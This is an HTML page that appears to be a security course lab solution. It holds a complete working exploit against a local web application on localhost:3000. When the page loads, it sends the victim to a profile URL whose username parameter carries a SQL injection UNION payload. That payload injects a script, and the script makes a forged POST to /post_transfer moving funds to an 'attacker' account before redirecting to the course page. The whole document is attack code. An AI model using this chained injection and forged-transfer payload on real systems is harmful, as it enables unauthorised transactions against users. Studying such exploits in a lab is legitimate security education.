<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title></title>
  </head>
  <body>
    <script>
      (function () {
        var destination = "http://sharif.edu/~kharrazi/courses/40441-011/";

        var transfer = [
          'fetch("/post_transfer",{',
          'method:"POST",',
          'headers:{"Content-Type":"application/x-www-form-urlencoded"},',
          'body:"destination_username=attacker&quantity=10"',
          '}).finally(function(){location.replace("', destination, '")});',
          'setTimeout(function(){location.replace("', destination, '")},1500);'
        ].join("");

        var payload = 'x" UNION SELECT \'x\',\'\',\'\',\''
          + '<scr' + 'ipt>'
          + transfer
          + '</scr' + 'ipt>'
          + '\',0-- ';

        location.replace(
          "http://localhost:3000/profile?username=" + encodeURIComponent(payload)
        );
      }());
    </script>
  </body>
</html>
